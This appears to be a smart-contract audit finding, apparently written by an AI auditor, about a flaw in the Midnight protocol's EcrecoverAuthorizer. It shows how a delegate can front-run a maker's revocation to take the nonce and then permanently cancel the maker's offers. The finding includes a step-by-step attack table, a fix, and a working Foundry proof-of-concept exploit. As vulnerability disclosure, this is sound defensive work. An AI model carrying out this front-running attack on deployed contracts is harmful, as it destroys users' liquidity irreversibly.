I have all the code I need. Let me trace the exact execution path.

### Title
Malicious Delegate Front-Runs Maker's Nonce-Based Revocation to Permanently Grief Offers - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts signatures from any address currently authorized by the `authorization.authorizer` in `Midnight.isAuthorized`, not only from the authorizer themselves. A malicious delegate can exploit this by observing a pending revocation in the mempool, front-running it with a different authorization that consumes the same nonce, causing the maker's revocation to revert with `InvalidNonce`. The attacker, now authorized by the maker, can then call `Midnight.setConsumed(group, type(uint256).max, maker)` to permanently cancel all of the maker's offers in any group.

### Finding Description

**Root cause — line 33–36 of `EcrecoverAuthorizer.setIsAuthorized`:**

```solidity
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

Any address that `Midnight.isAuthorized[maker][signer] == true` can sign an `Authorization` struct with `authorizer = maker` and any `authorized` / `isAuthorized` values of their choosing. The nonce at line 26 is consumed before the signature check, so whichever transaction lands first wins the nonce.

**Exact call sequence:**

| Step | Actor | Call | State after |
|---|---|---|---|
| 0 | maker | `Midnight.setIsAuthorized(ecrecoverAuthorizer, true, maker)` | `isAuthorized[maker][ECA]=true` |
| 0 | maker | `Midnight.setIsAuthorized(delegate, true, maker)` | `isAuthorized[maker][delegate]=true` |
| 1 | maker | signs `Auth{authorizer=maker, authorized=delegate, isAuthorized=false, nonce=N}`, broadcasts | pending in mempool |
| 2 | delegate | signs `Auth{authorizer=maker, authorized=attacker, isAuthorized=true, nonce=N}` with delegate key | — |
| 3 | delegate | `EcrecoverAuthorizer.setIsAuthorized(attackAuth, delegateSig)` | nonce[maker]=N+1; `isAuthorized[maker][attacker]=true` |
| 4 | maker | `EcrecoverAuthorizer.setIsAuthorized(revokeAuth, makerSig)` | **REVERTS** `InvalidNonce` |
| 5 | attacker | `Midnight.setConsumed(group, type(uint256).max, maker)` | `consumed[maker][group]=type(uint256).max` |

Step 3 passes because:
- Line 26: `N == nonce[maker]++` ✓ (nonce was N)
- Line 34: `IMidnight(MIDNIGHT).isAuthorized(maker, delegate)` → `true` ✓
- Line 46–47: `Midnight.setIsAuthorized(attacker, true, maker)` succeeds because `isAuthorized[maker][ECA]=true` ✓

Step 5 passes because:
- `Midnight.setConsumed` line 724: `isAuthorized[maker][attacker]` → `true` ✓
- Line 725: `type(uint256).max >= consumed[maker][group]` ✓

The `consumed` mapping is non-decreasing (enforced by `AlreadyConsumed` at line 725), so setting it to `type(uint256).max` is irreversible. The maker cannot undo the griefing even after revoking the attacker via a direct `Midnight.setIsAuthorized` call. [1](#0-0) [2](#0-1) 

### Impact Explanation

All of the maker's offers in any `group` are permanently cancelled: `consumed[maker][group] = type(uint256).max` causes every subsequent `take` to revert with `ConsumedUnits` or `ConsumedAssets` because `newConsumed <= offer.maxUnits/maxAssets` can never hold. The maker loses all active liquidity in the affected group with no on-chain remedy, since `consumed` is strictly non-decreasing. [3](#0-2) 

### Likelihood Explanation

**Preconditions:**
1. Maker has authorized `EcrecoverAuthorizer` in `Midnight` (standard usage pattern shown in every test).
2. Maker has authorized at least one delegate in `Midnight`.
3. Maker attempts to revoke that delegate via the signature path (e.g., using a relayer or meta-transaction).

All three are normal operational states. The front-run requires only mempool visibility, which is available on any public EVM chain. The attack is repeatable: after the maker increments their nonce and tries again, the delegate can front-run each attempt indefinitely. [4](#0-3) 

### Recommendation

Restrict `EcrecoverAuthorizer.setIsAuthorized` to accept only signatures from the `authorization.authorizer` themselves. Remove the delegate-signing branch entirely:

```solidity
// Before (vulnerable):
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);

// After (fixed):
require(signer == authorization.authorizer, Unauthorized());
```

The purpose of `EcrecoverAuthorizer` is to let the authorizer delegate off-chain. Allowing existing delegates to sign on behalf of the authorizer is not needed for any legitimate use case and creates this irrevocable griefing path. [5](#0-4) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IEcrecoverAuthorizer} from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract DelegateFrontRunTest is BaseTest {
    address internal delegate;
    address internal attacker;
    uint256 internal delegateKey;
    uint256 internal attackerKey;

    function setUp() public override {
        super.setUp();
        (delegate, delegateKey) = makeAddrAndKey("delegate");
        (attacker, attackerKey)  = makeAddrAndKey("attacker");

        // maker (lender) authorizes EcrecoverAuthorizer and delegate
        vm.startPrank(lender);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, lender);
        midnight.setIsAuthorized(delegate, true, lender);
        vm.stopPrank();
    }

    function _sign(Authorization memory auth, uint256 key) internal view returns (Signature memory) {
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 sep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", sep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, digest);
        return Signature(v, r, s);
    }

    function testDelegateFrontRunsRevocation() public {
        uint256 N = ecrecoverAuthorizer.nonce(lender); // == 0

        // Maker signs revocation of delegate (nonce=N)
        Authorization memory revokeAuth = Authorization({
            authorizer: lender, authorized: delegate,
            isAuthorized: false, nonce: N, deadline: block.timestamp + 1 days
        });
        Signature memory revokeSig = _sign(revokeAuth, privateKey[lender]);

        // Delegate front-runs: signs Auth{authorizer=maker, authorized=attacker, isAuthorized=true, nonce=N}
        Authorization memory attackAuth = Authorization({
            authorizer: lender, authorized: attacker,
            isAuthorized: true, nonce: N, deadline: block.timestamp + 1 days
        });
        Signature memory attackSig = _sign(attackAuth, delegateKey); // delegate signs on behalf of maker

        // Delegate submits first — consumes nonce N
        ecrecoverAuthorizer.setIsAuthorized(attackAuth, attackSig);

        // Assertions after front-run
        assertEq(ecrecoverAuthorizer.nonce(lender), N + 1);
        assertTrue(midnight.isAuthorized(lender, attacker));
        assertTrue(midnight.isAuthorized(lender, delegate)); // delegate NOT revoked

        // Maker's revocation now fails
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        ecrecoverAuthorizer.setIsAuthorized(revokeAuth, revokeSig);

        // Attacker permanently griefs maker's offers
        bytes32 group = bytes32(uint256(1));
        vm.prank(attacker);
        midnight.setConsumed(group, type(uint256).max, lender);

        assertEq(midnight.consumed(lender, group), type(uint256).max);
    }
}
```

**Expected assertions:**
- `nonce[maker] == N+1` after delegate's front-run
- `isAuthorized[maker][attacker] == true`
- `isAuthorized[maker][delegate] == true` (revocation failed)
- Maker's revocation reverts with `InvalidNonce`
- `consumed[maker][group] == type(uint256).max` (permanent, irreversible)

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-36)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
```

**File:** src/Midnight.sol (L366-373)
```text
        uint256 newConsumed;
        if (offer.maxAssets > 0) {
            newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
            require(newConsumed <= offer.maxAssets, ConsumedAssets());
        } else {
            newConsumed = consumed[offer.maker][offer.group] += units;
            require(newConsumed <= offer.maxUnits, ConsumedUnits());
        }
```

**File:** src/Midnight.sol (L723-727)
```text
    function setConsumed(bytes32 group, uint256 amount, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        require(amount >= consumed[onBehalf][group], AlreadyConsumed());
        consumed[onBehalf][group] = amount;
        emit EventsLib.SetConsumed(msg.sender, group, amount, onBehalf);
```

**File:** test/SetIsAuthorizedWithSigTest.sol (L54-72)
```text
    function testEcrecoverAuthorizer() public {
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
        Authorization memory auth = makeAuthorization(borrower, lender, true);
        Signature memory sig = signAuthorization(auth, borrower);

        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        assertEq(midnight.isAuthorized(borrower, lender), true);
        assertEq(ecrecoverAuthorizer.nonce(borrower), 1);

        auth = makeAuthorization(borrower, lender, false);
        sig = signAuthorization(auth, borrower);

        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        assertEq(midnight.isAuthorized(borrower, lender), false);
        assertEq(ecrecoverAuthorizer.nonce(borrower), 2);
    }
```
